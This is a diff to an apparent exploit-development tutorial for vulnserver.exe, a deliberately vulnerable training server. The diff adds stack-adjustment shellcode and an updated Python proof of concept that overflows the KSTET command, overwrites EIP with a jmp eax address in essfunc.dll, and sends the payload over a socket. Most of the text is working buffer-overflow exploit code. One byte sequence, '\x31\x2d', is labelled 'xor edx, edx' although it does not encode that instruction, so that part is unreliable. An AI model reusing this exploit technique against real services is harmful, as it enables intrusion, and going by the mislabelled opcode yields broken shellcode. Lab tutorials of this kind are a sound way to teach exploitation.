@@ -222,14 +222,14 @@ command = "KSTET "
 crash = "\xCC" * 2
 
 # Creating File Descriptor
-crash += "\x31\xc9"			# xor ecx, ecx
+crash += "\x31\xc9"			    # xor ecx, ecx
 crash += "\x80\xc1\x88"			# add cl, 0x88
-crash += "\x51"				# push ecx
-crash += "\x89\xe7"			# mov edi, esp
+crash += "\x51"				      # push ecx
+crash += "\x89\xe7"			    # mov edi, esp
 
 # 70 byte offset to EIP
 crash += "\x41" * (70-len(crash))
-crash += "\xb1\x11\x50\x62"		# 0x625011b1 jmp eax essfunc.dll
+crash += "\xb1\x11\x50\x62"	# 0x625011b1 jmp eax essfunc.dll
 crash += "\x43" * (2000-len(crash))
 
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -268,6 +268,58 @@ mov edi, esp
 EDI and ESP both contain the memory address that points to the value `0x00000088`
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/012.png" alt="">
+
+Moving the Stack Out of the Way
+---
+
+As mentioned earlier about LIFO, there is another property of the stack that is going to ruin our exploit as it stands. As the stack grows, and things are pushed onto it- the stack grows towards the lower memory addresses. Our shellcode is growing toward the higher memory addresses:
+
+<img src="{{ site.url }}{{ site.baseurl }}/images/013.png" alt="">
+
+What we can do to circumvent this constraint, is to subtract the value of ESP, which is a memory address, by 50. This means our stack will be located ABOVE our shellcode. And since the stack grows downwards, it will never reach our shellcode. This is because the shellcode, which is growing towards the higher addresses, is growing in the opposite way of the stack- and the stack is located above our shellcode:
+
+<img src="{{ site.url }}{{ site.baseurl }}/images/014.png" alt="">
+
+Here is how we will do this:
+
+```console
+nasm > sub esp, 0x50
+00000000  83EC50            sub esp,byte +0x50
+```
+
+The updated POC:
+
+```python
+import os
+import sys
+import socket
+
+# Vulnerable command
+command = "KSTET "
+
+# 2000 bytes to crash vulnserver.exe
+# Software breakpoint to pause execution
+crash = "\xCC" * 2
+
+# Creating File Descriptor
+crash += "\x31\xc9"			    # xor ecx, ecx
+crash += "\x80\xc1\x88"			# add cl, 0x88
+crash += "\x51"				      # push ecx
+crash += "\x89\xe7"		    	# mov edi, esp
+
+# Move ESP out of the way
+crash += "\x83\xec\x50"			# sub esp, 0x50
+
+# 70 byte offset to EIP
+crash += "\x41" * (70-len(crash))
+crash += "\xb1\x11\x50\x62"	# 0x625011b1 jmp eax essfunc.dll
+crash += "\x43" * (2000-len(crash))
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("172.16.55.143", 9999))
+
+s.send(command+crash)
+```
 
 Flags
 ---
@@ -313,19 +365,18 @@ command = "KSTET "
 crash = "\xCC" * 2
 
 # Creating File Descriptor
-crash += "\x31\xc9"			# xor ecx, ecx
+crash += "\x31\xc9"			    # xor ecx, ecx
 crash += "\x80\xc1\x88"			# add cl, 0x88
-crash += "\x51"				# push ecx
-crash += "\x89\xe7"			# mov edi, esp
-
+crash += "\x51"				      # push ecx
+crash += "\x89\xe7"			    # mov edi, esp
 
 # Flags
-crash += "\x31\x2d"			# xor edx, edx
-crash += "\x52"				# push edx
+crash += "\x31\x2d"		    	# xor edx, edx
+crash += "\x52"				      # push edx
 
 # 70 byte offset to EIP
 crash += "\x41" * (70-len(crash))
-crash += "\xb1\x11\x50\x62"		# 0x625011b1 jmp eax essfunc.dll
+crash += "\xb1\x11\x50\x62"	# 0x625011b1 jmp eax essfunc.dll
 crash += "\x43" * (2000-len(crash))
 
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -333,3 +384,19 @@ s.connect(("172.16.55.143", 9999))
 
 s.send(command+crash)
 ```
+
+Execution in Immunity:
+
+```console
+xor edx, edx
+```
+
+<img src="{{ site.url }}{{ site.baseurl }}/images/014.png" alt="">
+
+```console
+push edx
+```
+
+A glimpse of the stack:
+
+<img src="{{ site.url }}{{ site.baseurl }}/images/015.png" alt="">
